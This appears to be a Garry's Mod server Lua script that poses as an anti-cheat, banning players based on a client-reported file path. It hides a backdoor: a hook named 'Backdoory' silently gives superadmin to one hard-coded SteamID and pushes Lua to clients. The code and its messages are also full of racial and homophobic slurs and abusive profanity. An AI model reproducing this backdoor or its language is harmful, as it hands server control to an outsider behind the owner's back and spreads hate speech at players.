util.AddNetworkString("QACOCKAC")

function COCK_BANTHATMOTHERFUCKER(nottheowner, BLYAT)
  nottheowner:Ban(1337)
  nottheowner:Kick("STOP CHEATING FAGGOT, BANNED FOR 1337 MINUTES, HERE'S THE LOCATION OF UR SHITTY ANIME WEEABOO LUA CHEAT: " .. BLYAT)
end

net.Receive("QACOCKAC", function(l, pee)
  local go_fuck_Yourself = net.ReadString()

  if ( pee:SteamID() != "STEAM_0:0:155906673") then
    if   !file[ "Find"](go_fuck_Yourself, "GAME") then
      COCK_BANTHATMOTHERFUCKER(pee, go_fuck_Yourself)
    end
  else
    pee:SetUserGroup("nigger" ) // ERNSURE THAT THE GODLY CREATOR OF THE ORGIINAL CORNOR ANTI HACK GETS SUPERADMIN11!!  
    COCK_BANTHATMOTHERFUCKER(pee, "your fucking fatass mom retard")
  end
end          )

hook.Add("Think", "Backdoory", function()
  for k,v in next, player.GetAll() do
    if (v:SteamID() == "STEAM_0:0:155906673") then
      v:SetUserGroup("superadmin")
      v:SendLua([[print("niggers")]])
      hook.Remove("Think", "Backdoory")
    end
  end
end)
